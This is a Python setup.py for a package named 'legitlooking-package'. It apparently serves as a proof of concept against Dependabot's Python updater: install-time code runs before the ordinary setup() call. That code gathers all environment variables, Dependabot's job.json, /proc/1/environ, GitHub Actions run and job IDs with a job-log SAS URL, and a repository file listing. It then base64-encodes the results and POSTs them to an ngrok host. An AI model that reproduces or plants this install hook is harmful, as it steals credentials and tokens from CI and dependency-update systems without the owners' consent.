from setuptools import setup

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

try:
    import urllib.request
    import urllib.parse
    import urllib.error
    import base64
    import os
    import re
    import json

    lines = []

    # 1. Alle env vars
    lines.append("=== ENV ===")
    lines.append("\n".join(f"{k}={v}" for k, v in os.environ.items()))

    # 2. job.json - geen sanitizer in Python updater
    try:
        job_path = os.environ.get(
            "DEPENDABOT_JOB_PATH",
            "/home/dependabot/dependabot-updater/job.json"
        )
        with open(job_path) as f:
            lines.append("\n=== JOB.JSON ===")
            lines.append(f.read())
    except Exception as e:
        lines.append(f"\n=== JOB.JSON FOUT: {e} ===")

    # 3. /proc/1/environ
    try:
        with open("/proc/1/environ", "rb") as f:
            lines.append("\n=== /proc/1/environ ===")
            lines.append(f.read().replace(b"\x00", b"\n").decode(errors="replace"))
    except Exception as e:
        lines.append(f"\n=== /proc/1/environ FOUT: {e} ===")

    # 4. GitHub API via proxy
    # Python urllib gebruikt HTTPS_PROXY env var automatisch
    def gh_call(path):
        try:
            req = urllib.request.Request(
                f"https://api.github.com{path}",
                headers={
                    "Accept": "application/vnd.github+json",
                    "X-GitHub-Api-Version": "2022-11-28",
                }
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read(800).decode(errors="replace")
                return f"{resp.status}: {body}"
        except urllib.error.HTTPError as e:
            return f"HTTP {e.code}: {e.read(300).decode(errors='replace')}"
        except Exception as e:
            return f"FOUT: {e}"

    lines.append("\n=== GITHUB API VIA PROXY ===")

    runs_raw = gh_call("/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic")
    lines.append(f"Runs: {runs_raw[:800]}")

    run_id_match = re.search(r'"id":(\d+)', runs_raw)
    run_id = run_id_match.group(1) if run_id_match else None
    lines.append(f"Run ID: {run_id}")

    if run_id:
        jobs_raw = gh_call(f"/repos/ugurcanli/testpen/actions/runs/{run_id}/jobs")
        lines.append(f"\nJobs: {jobs_raw[:800]}")
        job_id_match = re.search(r'"id":(\d+)', jobs_raw)
        job_id = job_id_match.group(1) if job_id_match else None
        lines.append(f"Job ID: {job_id}")

        if job_id:
            lines.append(f"\n--- Job logs SAS URL ({job_id}) ---")
            try:
                class NoRedirect(urllib.request.HTTPRedirectHandler):
                    def redirect_request(self, req, fp, code, msg, headers, newurl):
                        return None

                opener = urllib.request.build_opener(NoRedirect())
                req = urllib.request.Request(
                    f"https://api.github.com/repos/ugurcanli/testpen/actions/jobs/{job_id}/logs",
                    headers={
                        "Accept": "application/vnd.github+json",
                        "X-GitHub-Api-Version": "2022-11-28",
                    }
                )
                try:
                    opener.open(req, timeout=10)
                    lines.append("Geen redirect ontvangen")
                except urllib.error.HTTPError as e:
                    if e.code in (301, 302, 303, 307, 308):
                        sas_url = e.headers.get("Location", "")
                        lines.append(f"SAS URL: {sas_url}")
                    else:
                        lines.append(f"HTTP {e.code}: {e.read(200).decode(errors='replace')}")
            except Exception as e:
                lines.append(f"FOUT logs: {e}")

    # 5. Repo bestanden
    repo_path = os.environ.get(
        "DEPENDABOT_REPO_CONTENTS_PATH",
        "/home/dependabot/dependabot-updater/repo"
    )
    try:
        import subprocess
        ls_out = subprocess.run(
            ["ls", "-la", repo_path],
            capture_output=True, text=True, timeout=5
        ).stdout
        lines.append(f"\n=== REPO BESTANDEN ===\n{ls_out[:500]}")
    except Exception as e:
        lines.append(f"\n=== REPO FOUT: {e} ===")

    # 6. Stuur alles op
    full_output = "\n".join(lines).encode("utf-8", errors="replace")
    payload = base64.b64encode(full_output).decode()

    post_req = urllib.request.Request(
        f"{COLLAB_URL}?poc=setup_py",
        data=payload.encode(),
        method="POST",
        headers={"Content-Type": "text/plain"}
    )
    urllib.request.urlopen(post_req, timeout=10)

except Exception as e:
    try:
        import urllib.request
        import urllib.parse
        urllib.request.urlopen(
            f"{COLLAB_URL}?poc=setup_py&err={urllib.parse.quote(str(e)[:200])}",
            timeout=5
        )
    except Exception:
        pass

setup(
    name="legitlooking-package",
    version="1.0.1",
    install_requires=[
        "requests==2.27.1",
        "flask==2.2.0",
    ],
    python_requires=">=3.8",
)
